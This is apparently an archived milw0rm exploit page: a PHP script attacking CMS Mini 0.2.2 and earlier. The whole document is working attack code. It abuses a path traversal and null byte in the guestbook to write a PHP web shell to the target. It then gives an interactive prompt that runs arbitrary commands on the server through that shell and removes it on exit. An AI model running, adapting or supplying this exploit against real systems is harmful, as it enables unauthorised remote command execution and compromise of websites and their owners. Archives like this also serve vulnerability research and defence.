<html><head><title>CMS Mini <= 0.2.2 Remote Command Execution Exploit</title></head><pre>--+++================================================================+++--
--+++====== CMS Mini &lt;= 0.2.2 Remote Command Execution Exploit ======+++--
--+++================================================================+++--

&lt;?php

function usage ()
{
	exit (
		&quot;\nCMS Mini &lt;= 0.2.2 Remote Command Execution Exploit&quot;.
		&quot;\n[+] Author  : darkjoker&quot;.
		&quot;\n[+] Site    : http://darkjoker.net23.net&quot;.
		&quot;\n[+] Download: http://ovh.dl.sourceforge.net/sourceforge/cmsmini/cmsmini-0.2.2.tar.gz&quot;.
		&quot;\n[+] Usage   : php xpl.php &lt;hostname&gt; &lt;path&gt;&quot;.
		&quot;\n[+] Ex.     : php xpl.php localhost /CMSmini&quot;.
		&quot;\n\n&quot;);
}

if ($argc != 3)
	usage;
$hostname = $argv [1];
$path = $argv [2];
$fp = fsockopen ($hostname, 80);
$post = &quot;message=&lt;? system (\$_GET ['cmd']); die ();?&gt;&quot;;
$request = &quot;POST {$path}/view/index.php?op=guestbook&amp;path=..&amp;p=file.php%00 HTTP/1.1\r\n&quot;.
	   &quot;Host: $hostname\r\n&quot;.
	   &quot;Connection: Close\r\n&quot;.
	   &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;.
	   &quot;Content-Length: &quot; . strlen ($post) . &quot;\r\n\r\n&quot;.
	   $post;
fputs ($fp, $request);
fclose ($fp);
$stdin = fopen(&quot;php://stdin&quot;, &quot;r&quot;);
while (1)
{
	echo &quot;$ &quot;;
	$cmd = str_replace (&quot; &quot;, &quot;%20&quot;, trim (fgets ($stdin, 1024)));
	if ($cmd == &quot;exit&quot;)
	{
		file_get_contents (&quot;http://{$hostname}{$path}/file.php?cmd=rm%20file.php&quot;);
		break;
	}
	echo file_get_contents (&quot;http://{$hostname}{$path}/file.php?cmd={$cmd}&quot;);
	
}
fclose ($stdin);
?&gt;

# milw0rm.com [2009-02-02]</pre></html>